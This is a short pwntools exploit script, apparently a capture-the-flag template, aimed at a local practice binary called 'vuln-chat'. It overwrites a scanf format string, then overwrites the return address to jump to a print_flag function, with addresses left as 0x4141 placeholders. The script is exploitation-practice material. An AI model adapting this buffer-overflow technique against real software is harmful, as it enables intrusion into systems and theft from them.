from pwn import *

# Establish the target process
target = process('./vuln-chat')

# Print the initial text
print(target.recvuntil(b"username: "))

addrInputStart = 0x4141 # fill this in with where input starts  
addrValueToOverwrite = 0x4141 # fill this in with address of value that is compared
paddingRequired1 = addrValueToOverwrite - addrInputStart

# Form the first payload to overwrite the scanf format string
payload0 = b""
payload0 += b"0"*paddingRequired1 # Fill up space to format string
payload0 += b"%s" # Overwrite it with "%s", aka, a string up until a null-byte

# Send the payload with a newline character
target.sendline(payload0)

# Print the text up to the second scanf call
print(target.recvuntil(b"I know I can trust you?"))

addrInputStart = 0x4141 # fill this in with where input starts  
addrValueToOverwrite = 0x4141 # fill this in with address of value that is compared
paddingRequired2 = addrValueToOverwrite - addrInputStart
printFlagAddr = 0x4141414141

# From the second payload to overwrite the return address
payload1 = b""
payload1 += b"1"*paddingRequired2 # Filler space to return address
payload1 += p32(printFlagAddr) # Address of the print_flag function

# Send the second payload with a newline character
target.sendline(payload1)

# Drop to an interactive shell to view the rest of the input
target.interactive()
